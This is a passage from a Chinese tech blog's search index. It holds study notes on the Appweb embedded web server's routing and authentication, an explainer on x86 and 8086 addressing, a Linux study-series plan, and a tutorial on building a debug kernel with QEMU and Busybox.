当收到请求时，它会测试各种路由并选择最好的路由来处理请求。在此过程中，路由可能会根据需要重定向或重写请求。 一个常规的路由块如下所示： \u003cRoute /info\u003e # match request URIs that begin with \"/info/\" Documents \"${DOCUMENT_ROOT}/info\" AuthType basic example.com # Use basic authentication Require secure # Must be accessed over SSL Require ability edit # Authenticated users must have the edit ability LimitRequestBody 100k # Only requests less than 100K are accepted RequestTimeout 10secs # Request must complete in \u003c 10 seconds RequestParseTimeout 2secs # Denial-of-service protection \u003c/Route\u003e 路由块中的部分常用指令如下： SetHandler —处理请求的请求handler (CGI, ESP, EJS, PHP, …) Documents — 服务内容所在目录 AuthType — 认证协议：basic, digest or web form Cache — 如何缓存响应 Redirect — 响应重定向 AddLanguageDir — 多语言内容 Compress —处理压缩的响应 Methods — 允许的请求方法 Require — 要求的用户凭据、规则或属性等 Limit* — 安全沙箱限制 SSLCertificateFile — SSL 配置 更多内容可以阅读 Appweb Request Routing 和 Appweb Configuration Directives. ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:1","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"2. Pipeline Engine Appweb 具备一个高效的、零拷贝的请求pipeline来处理请求，并生成对应的响应，这包括队列算法、数据包、缓冲区和时间调度。pipeline 的结构高度定制化，使用sendfile、异步 I/O 和向量化、离散/聚合的方式写入网络，以避免在写入网络之前在单个缓冲区中昂贵的数据和标头聚合消耗。 Nginx 企业 Web 服务器将性能提升到一个新的水平并在许多站点中取代了 Apache。但是嵌入式 Web 服务器一般要比常规的 web server 的守护进程处理速度上慢得多。虽然拥有千兆字节的内存会有助于提高 Web 服务器的速度，但使用正确的架构和内部设计更为重要。 Appweb 使用了嵌入式 Web 服务器的最佳实践，使得在嵌入式环境中也能取得与 Nginx 相同的处理速度。 与 Nginx 一样，Appweb 使用非阻塞、基于事件的设计来异步处理请求，客户端的每个请求无需使用专有进程或线程。当请求待处理时，Appweb 使用事件来为请求提供服务。所以每个 worker 线程可能会被许多请求共享，这种机制确保了快速响应，同时消耗较少的资源。 Appweb 将基于事件的内核与高效的 pipeline 相结合。pipeline 包含一个对输入和输出的数据进行处理的阶段，该阶段主要包含了各种各样的过滤器，这些过滤器会对数据进行分块、排列、上传和缓存。为了节省内存，pipeline会以数据包的形式进行数据传输，而不进行数据复制，数据包有效地携带数据包头或尾，以便数据可以在不复制的情况下进行封包，这对于高效的 HTTP 分块至关重要。 pipeline 与网络通信并使用平台上可用的最有效的 I/O 原语。 Appweb 支持向量套接字写入、sendfile 和快速 O/S 事件机制，如 kqueue 和 epoll， 这种架构极大地提升了处理速度并Web 服务器的“体型”娇小。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:2","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"3. Authentication Framework Appweb 集成了一个完整的认证框架，其中包含： 用户登录登出机制 安全密码传输 灵活密码存储 用户凭据验证 控制特定用户或用户组对资源的访问 Appweb 提供了3种认证协议：basic， digest 以及 web-form。如果用户使用 web-form 输入登录凭据，Appweb 会自动转换为SSL传输以确保传输安全。密码将被加密保存在一个平面文件(flat file)中或者使用本机操作系统的密码机制。 用户通过身份认证后，将获得一组“属性”的授权，这些是通过 Appweb 基于角色的授权方案为每个用户配置的。每个路由（一组 URI）都可以配置为在授予用户访问权限之前需要某些“属性”。 Appweb 的认证架构主要包含以下2个组件： 认证用户名/密码存储 认证协议 1. 认证用户名/密码存储 Appweb 有3种存储密码的方法： app - Application (custom) Password Database config - Configuration Directives in the app web.conf system - System Password Database app存储是用户应用程序将密码存储在数据库或其他自定义的存储密码的地方，用户应用程序负责实现凭据验证回调。Appweb 将调用该回调来访问自定义密码存储并将提供的凭据与用户密码进行比较。如果有需要在运行时修改用户和密码的需求，该种存储方法为首选项。使用该方法需要使用httpSetAuthVerifyByName API 来注册回调函数，此时注册的回调可以应用于所有的路由；如果使用httpSetAuthVerify API 注册回调，则只能应用于具体的某一个路由。 config 存储通过 Appweb 配置文件中的User指令来管理密码，authpass程序创建密码，并在appweb.conf中进行定义。在不需要动态添加、删除或编辑用户名或密码时可以使用该种方法。 system存储则是使用系统密码数据库(e.g. /etc/password) 具体使用何种存储方式由AuthStore指令指定。例如： AuthStore system 创建密码 创建密码使用authpass程序，如果使用应用程序定义数据库存储，则AuthStore应该设置成app，authpass程序创建的密码会存储在应用程序数据库中。 authpass的命令格式如下： authpass [--cipher blowfish|md5] [--file auth.conf] [--password word] realm username roles... --file filename 选项指定认证文件名称，如果未指定，密码将打印在标准输出上。 authpass 程序还可以修改配置文件中的密码定义。 --cipher 选项指定用于散列/加密密码的密码。 默认为 MD5，，但blowfish更安全。 Blowfish 更适用于 Basic 和 Form 身份验证方案。 如果未使用 --password 选项，authpass 将提示输入密码。 realm定义了一组密码，并通过 AuthType 指令设置，通常设置为公司域或产品名称。 注：身份验证文件必须存储在 Documents 目录或任何提供内容的目录之外。 2. 认证协议 认证协议定义了如何从用户处捕获用户凭据并提供给Appweb，Appweb 提供了不同的认证协议： Application Authentication 应用程序身份验证使用特定于应用程序的方式来捕获用户名和密码。用户应用程序负责实现控制逻辑以捕获用户凭据并通过登录和注销过程重定向客户端。此协议最适用于使用服务器端 Web 框架（如 ESP）的应用程序。 Web Form Authentication 表单身份验证方案使用 HTML Web 表单让用户输入用户名和密码凭据，并使用 HTTP Post 请求将凭据提交给服务器进行验证。 使用此协议，可以通过AuthType 指令定义特定的登录和注销页面。 Appweb 管理登录/注销过程，如果身份验证成功，则会创建登录会话并将 cookie 返回到客户端的浏览器，包含 cookie 的后续请求将被自动验证并提供服务。 要配置表单身份验证，AuthType 指令需要额外的参数来管理登录序列，包括指定登录网页、登录服务 URL、注销服务 URL、验证后显示的目标页面和注销后显示的目标页面。 格式为： AuthType form realm Login-Page Login-Service Logout-Service Logged-In-Destination Logged-Out-Destination 该指令定义在登录序列期间使用的 URL。该指令根据这些 URL 的要求创建请求路由，允许未经身份验证的用户访问登录页面和登录服务。这些 AuthType 参数中的每一个都是可选的，可以指定为空字符串\"\"以省略。 例如： \u003cRoute ^/\u003e AuthType form example.com /public/login.html /login /logout //public/login.html \u003c/Route\u003e \u003cRoute ^/public/\u003e Profix /public Document public AuthType none \u003c/Route\u003e 此示例为所有请求启用表单身份验证，并将客户端浏览器重定向到/public/login.html，用户可以输入用户名和密码。登录网页应将用户名和密码提交给绑定到/login URL的登录服务。当需要注销时，客户端应向绑定到/logout URL的注销服务提交 HTTP POST 请求。AuthType 指令中的最后两个字段是客户端浏览器在登录和注销后将重定向到的目标 URL。第二个 /public 路由无需身份验证即可访问“public”目录下的文档。 Login-Service 是绑定到内部服务的 URL，用于接收用户名和密码并对用户进行身份验证。此服务期望使用输入字段“用户名”和“密码”通过 POST 数据提交用户名/密码。可以通过在 AuthType 指令中为 Login-Service指定空字符串\"\"来提供自定义的登录和注销服务。如果使用自定义的登录服务，则应该调用httpLogin以根据配置的密码存储验证用户。 Web Form 这是一个最小示例登录页面： \u003chtml\u003e\u003chead\u003e\u003ctitle\u003elogin.html\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003cp\u003ePlease log in\u003c/p\u003e \u003cform name=\"details\" method=\"post\" action=\"/auth/login\" \u003e username \u003cinput type=\"text\" name=\"username\" value=''\u003e\u003cbr/\u003e password \u003cinput type=\"password\" name=\"password\" value=''\u003e\u003cbr/\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"OK\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 提交的两个字段必须命名为username和password以供“表单”身份验证方案使用。 如果登录尝试成功，客户端将收到包含会话 cookie 的响应，并将被重定向到目标 URL。如果目标 URL 包含一个referrer:前缀并且登录请求在 HTTP 标头中包含一个引用 URL，那么该引用 URL 将用作目标而不是硬连接目标。 注：“表单”身份验证机制以纯文本形式提交用户密码。为确保通信安全，应在使用 TLS/SSL 的安全连接上使用“表单”身份验证方案。 Basic Authentication Digest Authentication Basic 和 Digest 身份验证是 HTTP/1.1 RFC2616 规范定义的 HTTP 协议机制。因为它们在 HTTP 协议级别运行，所以功能简单，且灵活性差。当客户端尝试访问受保护的内容时，客户端的浏览器会显示一个通用弹出对话框以提示用户输入凭据。 应该只将基本和摘要式身份验证用作最后的手段。 Basic 和 Digest 身份验证标准使用弱密码，通过网络重复发送凭据，并且不够安全。基本身份验证在每个请求中以明文形式传输密码。摘要式身份验证使用弱 MD5 密码，并且两者都要求对所有请求使用 SSL 以确保最低限度的安全。此外，Basic 和 Digest 都不提供可靠的注销机制。注销适用于某些浏览器，但不适用于其他浏览器甚至同一浏览器的不同版本。 Appweb 身份验证框架十分全面，使开发人员不必将各个部分进行拼凑组合成一个认证方案。更为详细的内容可以参考Authentication。 3. web框架 如果使用 ESP、PHP 或其他 Web 框架，则不应将扩展的AuthType form指令与 URL 一起使用。这是因为这些 web 框架集成了登录工具，在 web 框架中使用起来更自然。扩展的 AuthType form指令适合使用静态网页的网站，因为它可以在登录期间无缝管理浏览器页面转换。使用 ESP Web 框架时，请选择使用AuthType app身份验证协议。 4. SSL加密 在考虑对发送或接收来自应用程序的敏感信息时，有两种基本的安全策略： 保证整个应用","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:3","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"4. Embedded Server Pages ESP web Framework 可以说是 Appweb 中最优秀的部分，它是一个典型的MVC框架，可以容易地创建快速、动态的web应用。ESP是一个基于C的web框架，但不像一般的C编码，ESP框架的web页面支持嵌入式C编码。甚至，它支持网页修改时动态透明的重新编译和重新加载。它还检测并自动重新编译修改后的 ESP 控制器（用 C 编写）。这使得 ESP 的行为就像一个脚本化的 Web 框架。 为了解决C语言常见的内存分配和内存泄漏问题，ESP 使用了垃圾回收器在请求处理完成后来自动释放内存。 ESP 框架提供了一个应用生成器、web 页面模板引擎、MVC 框架、 HTML 控制库和 API 扩展来创建 web 应用程序。 ESP 应用程序通常定义在一组目录中： cache — 缓存预编译的 ESP 控制器和页面 client — 客户端 web 页内容、图片、样式等 controllers — ESP 控制器方法 layouts — 主页面布局 db — 数据库和数据库迁移 可以使用以下命令来快速创建一个新的 ESP 应用程序： mkdir blog cd blog esp install esp-html-mvc 关于 ESP 框架的内容十分丰富，可以单独拿出来详细说明，给出官网文档 ESP Docs。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:4:4","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"五、安全性 web server 通常通过数量众多的安全测试来保证安全性，但是作用甚微，构建一个设计安全的 web server 远比通过测试保证安全的方式更有效。对于嵌入式 web server 更难保证安全性，因为要在低内存占用和不降低性能的前提下进行。 Appweb 通过使用一个安全的 Portable Runtime (MPR)， 从一开始就重点保证安全性。MPR 是一个跨平台层，它使得 Appweb 的超过97%的代码都是可移植的。它包括许多帮助创建安全应用的机制，比如它包括一个安全的字符串和缓冲区处理模块，以帮助消除困扰许多产品的缓冲区溢出问题。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:5:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"六、沙箱 Appweb 引入沙箱来严格控制对系统资源的占用。这意味着在严格控制的范围内运行 Web 服务器，以便请求错误不会影响系统操作。 Appweb 还针对几种常见的拒绝服务攻击进行了加固。 Appweb 根据不同需求可做如下配置： 限制内存使用并且不允许超过内存限制的预定义的数值 拒绝过大的请求 拒绝过长的URL 由指定的用户帐户或用户组运行 基于以上基础，Appweb 提供了 Secure Sockets Layer 和摘要认证以及防御策略。 ","date":"2021-05-31","objectID":"/2021/05/Appweb-1/:6:0","tags":["Appweb","Security"],"title":"Appweb Learning Notes","uri":"/2021/05/Appweb-1/"},{"categories":["Tech"],"content":"从0到无穷学习Linux操作系统相关内容","date":"2021-01-03","objectID":"/2021/Linux/x86/","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"Linux操作系统的大千世界——OS——x86架构 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:0:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"前言 完整的计算机由操作系统和硬件组成，必须两者兼备，而且两者要完美适配才能良好运作。操作系统的数量屈指可数，但是在操作系统下面的硬件却是千千万万。如何做到操作系统兼容各类各式的硬件环境呢？大家都协议一个通用的架构，大家都适配这个架构好了。于是，一个业内通用的架构——x86架构诞生了。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:1:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"一、计算机的工作模式 计算机的硬件根据功能划分成各自独立的产品，在进行组装时需要按照一定的顺序将复杂的设备和连接线安装好。如何安装我知道，但是为什么要这么安装呢？ 下图为一个硬件图和计算机的逻辑图，从这里我们可以大概看到计算机的工作模式： CPU，Central Processing Unit，计算机核心中的核心，所有设备的运作均围绕CPU展开。 总线，Bus，CPU连接其他设备时使用，即主板上数量庞大的集成电路，组成了CPU和其他设备的高速通信通道。 内存，Memory，保存CPU计算的中间结果，使得CPU在后续运算中可以使用临时保存的计算数据。 其他设备，显示器、磁盘、可移动存储介质等。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:2:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"1. CPU和内存如何进行配合？ CPU可以划分为3个单元：运算单元、数据单元和控制单元。运算单元专注计算，所使用的数据、计算的结果由数据单元保存（这里需要注意的一点是，虽然CPU可以通过内存总线与内存通信，计算使用的数据和计算结果可以保存在内存中，但是这样速度很慢，每次通过总线传输会很消耗时间，所以CPU内部专门开发了一个数据单元，保存临时、少量的计算数据，这样速度会大幅提升）。数据单元包括CPU内部的缓存和寄存器组，空间小，速度快，仅用于临时存放运算数据。控制单元则负责任务分发和调度，用于获取下一条指令，然后执行，会指导运算单元从数据单元中取出多少数据、怎样进行计算、计算结果放在数据单元的何处等。 程序运行后，每个进程会有自己独立的内存空间，例如图中进程A和进程B，互相隔离。程序的运行一般流程是开辟出一篇内存空间，程序的磁盘上的二进制文件被加载到内存空间中，形成代码段、数据段等。进程A和进程B在成功加载后，彼此的运行空间互相隔离，但是并不连续，这里的不连续是指分配的内存空间在物理上不一定是连续的，这主要与Linux操作系统的内存分配机制有关，后续会做详细深入分析。而且除了上图中的代码段和数据段，还会有其他的段。 程序运行中需要操作的数据和产生的运算结果，会存放在数据段中。CPU如何执行程序，操作这些数据，产生运算结果，并写回内存呢？ CPU的控制单元中有一个指令指针寄存器，保存了下一条指令在内存中的地址。控制单元会从代码段中不断获取指令的地址放入该进村其中，在执行时直接读取该寄存器，就可以知道下一条要执行的指令了。 指令一般分两部分，第一部分是做什么操作，第二部分是该操作要操作的数据。要执行这条指令，需要将第一部分交给运算单元，第二部分交给数据单元，数据单元根据数据的地址，从数据段里读到数据寄存器中，然后再参与运算。运算单元做完运算，产生的结果暂存在数据单元的数据寄存器中，等待指令将其写回到内存中的数据段中。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:2:1","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"2. 进程切换 上面所讲的各种操作均在进程A中进行，那么进程B呢？CPU里有两个专门的寄存器保存当前处理进程的代码段、数据段的起始地址。如果寄存器里保存的是进程A的地址，那么就执行进程A的指令；如果切换为进程B的地址，那么就执行进程B的指令，这个过程称为进程切换(Process Switch)。 进程切换是多任务系统的必备操作，后续会进行深入分析。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:2:2","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"3. 地址总线和数据总线 CPU和内存的数据传输主要靠总线，总线在整体上分为两类： 地址总线(Address Bus)，访问地址数据，即读取内存中何处的数据 数据总线(Data Bus)，读取到的数据 地址总线的位数，决定了能访问的地址范围。如何理解？例如总线只有2位，那么能访问的地址就为00、01、10、11这4个地址，如果是3位就可以访问8个地址，所以地址总线位数越多，能访问的地址范围就越广。 数据总线的位数，决定了一次可以读多少数据。如何理解？例如总线只有2位，那么CPU一次只能拿2位，想要拿8位，就需要读4次。所以数据总线位数越多，一次可以读取的数据就越多，访问速度也就越快。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:2:3","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"4. x86架构 x86泛指一系列基于[Intel 8086](https://baike.baidu.com/item/Intel 8086)且向后兼容的中央处理器指令集架构。最早的8086处理器于1978年由Intel推出，为16位微处理器。但是让x86真正得到推广的，是IBM。因为IBM的PC卖得太好，被起诉垄断，无奈之下公开了一些技术，这使得业内其他品牌逐步都开始采用IBM的“Intel 8088芯片+MS-DOS”的PC模式。Intel的技术因此成为了行业的开放事实标准。由于该系列开端与8086，因此称为x86架构。 虽然后来的Intel的CPU的数据总线和地址总线越来越宽，处理能力越来越强，但是始终坚持标准、开放、兼容的原则，因此构建了一个庞大的软硬件生态。 部分芯片和总线数据如下： 型号 总线位宽 地址位 寻址空间 8080 8 16 64k (2^16) 8086 16 20 1M (2^20) 8088 8 20 1M (2^20) 80386 32 32 4G (2^32) ","date":"2021-01-03","objectID":"/2021/Linux/x86/:2:4","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"三、8086的原理 x86中最经典的一款处理器就是8086处理器，至今为止很多操作系统仍然保持对该处理器的兼容性。 下图为CPU内部组件构成图： 数据单元，包含8个16位的寄存器：AX、BX、CX、DX、SP、BP、SI、DI。其中，AX、BX、CX、DX可以拆分成2个8位的寄存器使用：AH、AL、BH、BL、CH、CL、DH、DL。H代表High，表示高位，L代表Low，表示地位。这样以来，长数据可以直接使用完整的寄存器，而短数据也可以妥善处理。 控制单元，IP（Instruction Pointer Register）寄存器即指令指针寄存器，用于确定下一条指令的地址。CPU根据该寄存器不断将指令从内存的代码段中加载到指令队列里，然后交给运算单元执行。4个段寄存器，CS、DS、SS、ES寄存器，则用于进程切换中。CS指代码段寄存器（Code Segment Register），通过它可以找到代码在内存中的地址；DS是数据段寄存器，通过它可以找到数据在内存中的地址。SS是栈寄存器（Stack Segment Register），一般存放堆栈段的首地址，配合SP或BP使用，ES是附加段寄存器（Extra Segment）。当前面的段寄存器不够用时，可以使用ES寄存器。 进行运算时如何加载内存中的数据呢？ 通过DS确定数据段地址 通过寄存器确定偏移量（Offset），确定待用数据在段中的偏移（代码段的偏移量会存放在IP寄存器，数据段的偏移量存放在通用寄存器中） 通过\"起始地址 * 16 + 偏移量\"确定最终地址 这里需要注意，CS和DS均为16位，IP也是16位，即起始地址和偏移量都是16位，但是8086的地址总线时20位，所以需要通过上面的公式计算出最终的数据地址。 根据地址总线长度，8086的最大寻址能力为1M。且因为偏移量为16位，所以一个段的最大的大小为2^16=64K。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:3:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"四、32位处理器 核心就是扩展总线位宽，扩大内存。地址总线变为32根，寻址能力达到2^32=4G。如何使得硬件保持兼容呢？ 首先，扩展通用寄存器，将8个16位寄存器扩展为32位，但是依然可以保留16位和8位的使用方式（8位的使用只能在低位，如果高位也切割，就会不兼容）。IP寄存器扩展成32位，同时兼容16位。本质上，思想跟8086的思想是一样的，只是硬件做了升级。 回顾一下8086的寻址方式，20位地址的使用其实是有点尴尬的，结果还导致必须使用“起始地址 * 16 + 偏移量”的方式来计算实际地址。如果寄存器全部变成32位，4G的内存空间都可以访问到，是不是可以省去计算公式呢？ 在32位寄存器的系统中，CS、DS、SS、ES仍然为16位，但不再是段的起始地址。段的起始地址放在内存的某个地方，这个地方是一个表格，表格中的每一项都是一个段描述符（Segment Descriptor），段描述符中放的才是真正的段的起始地址。而段寄存器则存放具体是表格中的哪一项，称为选择子（Selector）。这样，就将从一个段寄存器直接获取段的起始地址，变成先间接地从段寄存器后的表格中的一项，然后从表格的一项中后去真正的段起始地址。实际上为了快速拿到段起始地址，段寄存器会从内存中拿到CPU的描述符高速缓存器中。（这个保存各个段的起始地址的表格其实是GDT（Global Descriptor Table，全局描述符表）和LDT（Local Descriptor Table，局部描述符表）） 32位这种设计方案的思想很值得大家好好琢磨，单纯地寻址总是要比计算+寻址地速度快的。个人认为，这种方案可以说纠正了20位地址总线的一种技术落后导致的设计错误，而且这种方案远远比20位的更灵活。 但是这样会导致不兼容问题的出现，怎么办？大的小的我都要。 32位架构下，出现了实模式（Real Pattern）和保护模式（Protect Pattern）。实模式就是前面的运行模式，保护模式就是后面的运行模式。在系统刚启动时，运行在实模式，运行成功后变为保护模式。这其实是一种通过切换模式实现兼容的方案。可见技术的发展，也影响着人的思想的发展。 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:4:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"五、参考 专栏 – 《趣谈Linux操作系统》 ","date":"2021-01-03","objectID":"/2021/Linux/x86/:5:0","tags":["Linux"],"title":"Linux操作系统的大千世界——OS——x86架构","uri":"/2021/Linux/x86/"},{"categories":["Tech"],"content":"从0到无穷学习Linux操作系统相关内容","date":"2021-01-02","objectID":"/2021/Linux/description/","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"Linux操作系统的大千世界 – 综述 ","date":"2021-01-02","objectID":"/2021/Linux/description/:0:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"前言 Linux操作系统，目前服务器领域体量最大的操作系统。之前学习操作系统时，并未单独对Linux操作系统进行深入的学习和理解，仅仅停留在常规使用和运维层面，而且只在需要时对部分功能和过程进行了深入的探索。在学习编程时，也并没有将Linux当作编程主力，当时还主要是在做Windows平台下的开发，因此对于Unix平台和类平台的编程开发能力相对较弱。基于以上两点，我觉得从头再完整过一遍Linux，将Linux相关内容整理成完整的知识体系架构。 学习过程中我会简单记录中间遇到的重点和问题，这些问题可能需要一定的基础才能理解，本系列部分内容可能对于新手并不友好（仅仅是部分内容，相信大部分大家还是都能看懂的）。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:1:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"内容划分 目前计划将Linux相关内容整体上划分为两部分 – 操作系统和Unix编程（以Linux为开发平台），后续如果时间和精力允许的情况下，可能会更新部分Linux安全相关的内容 – 漏洞（偏分析）和攻防（偏技巧）。 操作系统部分会大致按照常规操作系统的课程来安排内容，中间会参考部分公开课和各种书籍、博客等，均会给出相关链接和引用说明，方便大家更好地找到资源。 Unix编程部分则会按照《Unix环境高级编程（第3版）》和《Unix网络编程》来安排内容，中间会对部分内容做扩充，也会对一些基础知识做裁剪，争取只保留干货和精华。 漏洞部分暂时的编排还没确定，主要担心时间精力不够，出现质量偏低的情况。但总原则是以漏洞分析为主，漏洞挖掘为补充。漏洞分析将会介绍规范化的漏洞分析流程，漏洞挖掘部分将介绍自己学习漏洞挖掘的过程。 攻防部分暂时的编排也没确定，总原则是以渗透和漏洞利用技巧为主，主要是做各种技巧的搜集整理。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:2:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"更新周期 更新时间不定，总原则是每周至少更新一次，争取一年内更新完操作系统部分和Unix编程的1/2内容。 最后，附上自己喜欢的一句话：人世纷乱，出入平安。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:3:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"QEMU + Busybox编译Linux内核","date":"2020-12-23","objectID":"/2020/12/qemu/","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"QEMU + Busybox 模拟 Linux 内核环境 ","date":"2020-12-23","objectID":"/2020/12/qemu/:0:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"前言 最近转Linux平台，开始深入Linux内核相关，总结一下进行Linux内核环境模拟流程。结合Linux的内核源码一起，效果会比较好。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:1:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"准备环境 ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"主机环境 Ubuntu 18.04 Linux ubuntu 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"需要使用的软件 使用主流的qemu+busybox进行模拟，底层的模拟实现软件内部完成，可以将重心放在内核调试上，避免在环境上浪费过多时间。qemu模拟器原生即支持gdb调试器，所以可以方便地使用gdb的强大功能对操作系统进行调试。 首先安装qemu，依次执行以下命令： sudo apt-get install qemu sudo apt-get install qemu-system sudo apt-get install qemu-user-static 这里不建议使用源码编译的方式进行安装，个人建议是节省时间在核心工作上，工具越快搭建好越能提升效率。源码编译涉及到编译器和主机环境各异性的问题，中间可能出现各种情况，浪费时间。（注意，安装好后，无法直接qemu无法运行，需要使用qemu-system-i386, qemu-system-x86_64, qemu-system-arm这种格式的命令进行运行。如果嫌麻烦，可以设置软链接。） 安装busybox，直接busybox的github上拖源码下来即可。在实际进行文件系统制作的时候再进行其他操作。 最后是下载想进行编译的Linux内核源码，这里给出一个各个版本的Linux内核源码集合。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译调试版内核 ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译正常流程 首先对Linux内核进行编译： cd linux-3.18.6 make menuconfig make bzImage 注意，这里在进入menuconfig后，需要开启内核参数CONFIG_DEBUG_INFO和CONFIG_GDB_SCRIPTS。gdb提供了python接口进行功能扩展，内核基于python接口实现了一系列辅助脚本来简化内核的调试过程。 Kernel hacking ---\u003e [*] Kernel debugging Compile-time checks and compiler options ---\u003e [*] Compile the kernel with debug info [*] Provide GDB scripts for kernel debuggin ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译可能遇到的问题 执行make bzImage时遇到的问题： fatal error: linux/compiler-gcc7.h: No such file or directory 提示缺少compiler-gcc7.h这个文件，是由于内核版本较低和gcc版本不匹配造成的有三种解决方法： 1.在内核文件夹中include/linux目录下找到compiler-gcc4.h文件，不同内核版本可能不一样，也有可能是compiler-gcc3.h,将它重命名为compiler-gcc7.h。然后重新编译一下就好了。 2.在新的内核源码中拷贝一个compiler-gcc7.h，将它拷贝到内核文件夹include/linux目录下，重新编译即可。 3.重装一个版本低一点的gcc。 fatal error: asm/types.h: No such file or directory linux添加到asm-generic的软链接: ln -s /usr/include/asm-generic asm ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"制作initramfs根文件系统 Linux启动阶段，boot loader加载完内核文件vmlinuz之后，便开始挂载磁盘根文件系统。挂载操作需要磁盘驱动，所以挂载前要先加载驱动。但是驱动位于/lib/modules，不挂载磁盘就访问不到，形成了一个死循环。initramfs根文件系统就可以解决这个问题，其中包含必要的设备驱动和工具，boot loader会加载initramfs到内存中，内核将其挂载到根目录，然后运行/init初始化脚本，去挂载真正的磁盘根文件系统。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译busybox 首先需要注意，busybox默认编译的文件系统是和主机OS一样的位数，也就是Ubuntu是x86的，编译出的文件系统就是x86的，如果Ubuntu是x64的，编译出的文件系统是x64的。要保持前面编译的Linux内核和文件系统的位数一样。 cd busybox-1.32.0 make menuconfig make -j 20 make install 进入menu后，修改参数如下： 其次，修改为静态链接： Settings ---\u003e [*] Build static binary (no shared libs) 然后再执行make和install操作。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"创建initramfs 